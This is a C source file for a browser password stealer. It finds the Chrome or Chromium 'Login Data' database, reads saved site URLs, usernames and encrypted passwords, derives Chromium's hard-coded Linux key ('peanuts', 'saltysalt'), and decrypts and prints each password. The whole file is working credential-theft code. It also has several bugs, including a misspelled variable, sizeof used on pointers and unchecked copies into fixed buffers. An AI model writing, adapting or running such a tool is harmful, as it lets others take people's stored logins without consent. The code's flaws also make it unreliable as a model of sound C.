#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sqlite3.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

#ifdef _WIN32
#include <Windows.h>
#include <winbase.h>
#endif

#define KEY_LEN 16

struct DbUserEntry
{
    char url[256];
    char username[50];
    char password[128];
    char encpassword[128];
    char hexenc[256];
};

char *get_chrome_path()
{
    char *buff = (char *)malloc(256);
    char *chromePath;

#ifdef _WIN32
    chromPath = "\\Google\\Chrome\\User Data\\Default\\Login Data";
    if (!GetEnvironmentVariable(L"LOCALAPPDATA", buff, sizeof(buff)))
    {
        printf("[!] Failed to get environment variable: LOCALAPPDATA");
        exit(-1);
    }
#else
    chromePath = "/.config/chromium/Default/Login Data";
    buff = getenv("HOME");
    if (!buff)
    {
        printf("[!] Failed to get environment variable: HOME");
        exit(-1);
    }
#endif

    strncat(buff, chromePath, sizeof(chromePath));

    return buff;
}

char *parse_cmd_line(int argc, char **argv)
{
    int opt;
    char *argbuf = (char *)malloc(256);

    while ((opt = getopt(argc, argv, "f:")) != -1)
    {
        switch (opt)
        {
        case 'f':
            realpath(optarg, argbuf);
            break;
        default:
            fprintf(stderr, "Usage: %s [-f file]\n", argv[0]);
            exit(1);
        }
    }
    return argbuf;
}

int get_row_count(sqlite3 *db)
{
    sqlite3_stmt *stmt;

    int rc;
    int rowcount;
    char query[] = "select count(*) from logins;";

    rc = sqlite3_prepare_v2(db, query, -1, &stmt, NULL);
    if (rc != SQLITE_OK)
    {
        fprintf(stderr, "Prepared statement failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }
    rc = sqlite3_step(stmt);
    if (rc != SQLITE_ROW)
    {
        fprintf(stderr, "Couldn't fetch data: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }
    rowcount = sqlite3_column_int(stmt, 0);

    return rowcount;
}

char *PBKDF2_HMAC_SHA_1_key()
{
    unsigned int i;
    unsigned char *out;
    char pass[] = "peanuts";
    // saltysalt
    unsigned char salt[] = {'s', 'a', 'l', 't', 'y', 's', 'a', 'l', 't'};
    int32_t iterations = 1;

    out = (unsigned char *)malloc(sizeof(unsigned char) * KEY_LEN);

    PKCS5_PBKDF2_HMAC_SHA1(pass, strlen(pass), salt, strlen(salt), iterations, KEY_LEN, out);

    /*
    printf("out: ");
    for (i = 0; i < KEY_LEN; i++)
    {
        printf("%02x", out[i]);
    }
    printf("\n");
    */

    return out;
}

void clean(unsigned char *data, int length)
{
    int end = 0;
    while (end < length)
    {
        if (data[end] >= '\x0a' && data[end] < '\x20')
        {
            break;
        }
        end++;
    }

    memset((void *)data + end, 0x00, length - end);
    return;
}

int decrypt_login_data(struct DbUserEntry *login_data)
{
    unsigned char *key = PBKDF2_HMAC_SHA_1_key();

    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x20, AES_BLOCK_SIZE);

    unsigned char *dec = (unsigned char *)malloc(0x20);
    AES_KEY dec_key;
    if (dec == NULL)
    {
        printf("Failed to malloc decryption buffer");
        return 0;
    }

    if (AES_set_decrypt_key(key, 128, &dec_key) < 0)
    {
        printf("Failed to set decryption key!");
        return 0;
    }

    AES_cbc_encrypt(login_data->encpassword + 3, dec, 16, &dec_key, iv, AES_DECRYPT);

    clean(dec, 0x20);
    // printf("Decrypted: %s (%d bytes)\n", dec, strlen(dec));

    memcpy(login_data->password, dec, strlen(dec));

    free(dec);
    free(key);

    return 1;
}

int main(int argc, char **argv)
{

    char *login_data_path;

    sqlite3 *db;
    sqlite3_stmt *res;

    // printf("argc: %d\n", argc);

    if (argc > 1)
    {
        login_data_path = parse_cmd_line(argc, argv);
    }
    else
    {
        login_data_path = get_chrome_path();
    }

    printf("Extracting passwords from: %s\n\n", login_data_path);

    int retVal = sqlite3_open(login_data_path, &db);

    if (retVal != SQLITE_OK)
    {

        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }

    retVal = sqlite3_prepare_v2(db, "SELECT action_url, username_value, password_value, hex(password_value) FROM logins", -1, &res, 0);

    if (retVal != SQLITE_OK)
    {

        fprintf(stderr, "Couldn't fetch data: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }

    struct DbUserEntry *login_data = malloc(sizeof(struct DbUserEntry) * get_row_count(db));

    int login_data_iterator = 0;
    while (sqlite3_step(res) != SQLITE_DONE)
    {
        struct DbUserEntry login_data_entry;

        strcpy(login_data_entry.url, sqlite3_column_text(res, 0));
        strcpy(login_data_entry.username, sqlite3_column_text(res, 1));
        memcpy(login_data_entry.encpassword, (unsigned char *)sqlite3_column_blob(res, 2), sqlite3_column_bytes(res, 2));
        strcpy(login_data_entry.hexenc, sqlite3_column_text(res, 3));
        memset(login_data_entry.password, 0x00, 128);

        login_data[login_data_iterator] = login_data_entry;
        login_data_iterator++;
    }

    printf("Extracted Password(s):\n");
    for (int i = 0; i < login_data_iterator; i++)
    {
        if (!decrypt_login_data(&login_data[i]))
        {
            printf("Failed to decrypt login data");
        }
        char buf[255] = {0};
        printf("Password for user '%s': %s\n", login_data[i].username, login_data[i].password);
    }

    free(login_data_path);
    free(login_data);

    sqlite3_finalize(res);
    sqlite3_close(db);

    return 0;
}